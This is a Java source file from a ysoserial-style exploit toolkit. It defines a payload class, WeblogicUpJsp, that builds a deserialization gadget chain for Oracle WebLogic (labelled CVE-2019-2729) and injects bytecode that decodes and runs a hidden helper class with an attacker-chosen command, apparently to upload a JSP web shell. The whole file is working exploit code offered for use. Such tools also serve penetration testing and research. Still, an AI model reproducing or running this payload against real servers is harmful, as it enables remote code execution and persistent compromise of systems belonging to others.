package ysoserial.payloads;

import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.LinkedHashSet;

import javax.xml.transform.Templates;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import weblogic.apache.xalan.processor.TransformerFactoryImpl;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.Gadgets.Foo;
import ysoserial.payloads.util.Gadgets.StubTransletPayload;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

@SuppressWarnings({ "rawtypes", "unchecked" })
@PayloadTest(precondition = "isApplicableJavaVersion")
@Dependencies("CVE-2019-2729:1.0")// "not use ProcessBuilder/Runtime/ProcessImpl run command"
@Authors({ Authors.MTX })
public class WeblogicUpJsp implements ObjectPayload<Object> {

  public Object getObject(final String command) throws Exception {
    final Object templates = Gadgets.createTemplatesImpl(command);
    
    // start
    ClassPool pool = ClassPool.getDefault();
    pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
    final CtClass clazz = pool.get(StubTransletPayload.class.getName());
    // end 

    String zeroHashCodeStr = "f5a5a608";

    HashMap map = new HashMap();
    map.put(zeroHashCodeStr, "foo");

    InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS)
        .newInstance(Override.class, map);
    Reflections.setFieldValue(tempHandler, "type", Templates.class);
    Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);

    LinkedHashSet set = new LinkedHashSet(); // maintain order
    set.add(templates);
    set.add(proxy);

    Reflections.setFieldValue(templates, "_auxClasses", null);
    Reflections.setFieldValue(templates, "_class", null);

    map.put(zeroHashCodeStr, templates); // swap in real object
    
    
 // 返回执行命令
    clazz.makeClassInitializer().insertAfter("" 
    		+ "String R = \"" + ysoserial.payloads.util.MyTest.getBase64(ysoserial.payloads.util.UpJsp.class.getName()) + "\";"
    		+ "sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();"
    		+ "byte[] bt = decoder.decodeBuffer(R);"
    		+ "org.mozilla.classfile.DefiningClassLoader cls = new org.mozilla.classfile.DefiningClassLoader();"
    		+ "Class cl = cls.defineClass(\"ysoserial.payloads.util.UpJsp\",bt);"
    		+ "java.lang.reflect.Method m = cl.getMethod(\"say\",new Class[]{String.class});"
    		+ "m.invoke(cl.newInstance(),new Object[]{\""+ command + "\"});"
    		);

    // 给payload类设置一个名称
    // unique name to allow repeated execution (watch out for PermGen exhaustion)
    clazz.setName("hktalent.mtx" + System.nanoTime());

    // 获取该类的字节码
    final byte[] classBytes = clazz.toBytecode();

    // inject class bytes into instance
    Reflections.setFieldValue(templates, "_bytecodes",
            new byte[][] { classBytes, ClassFiles.classAsBytes(Foo.class) });

    // required to make TemplatesImpl happy
    Reflections.setFieldValue(templates, "_name", "mtx");
    Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
    

    return set;
  }

  public static boolean isApplicableJavaVersion() {
    JavaVersion v = JavaVersion.getLocalVersion();
    return v != null && (v.major < 7 || (v.major == 7 && v.update <= 21));
  }

  public static void main(final String[] args) throws Exception {
//	  System.out.println(ysoserial.payloads.util.MyTest.getBase64(ysoserial.payloads.util.XmlExp1.class.getName()));
    PayloadRunner.run(WeblogicUpJsp.class, args);
  }

}
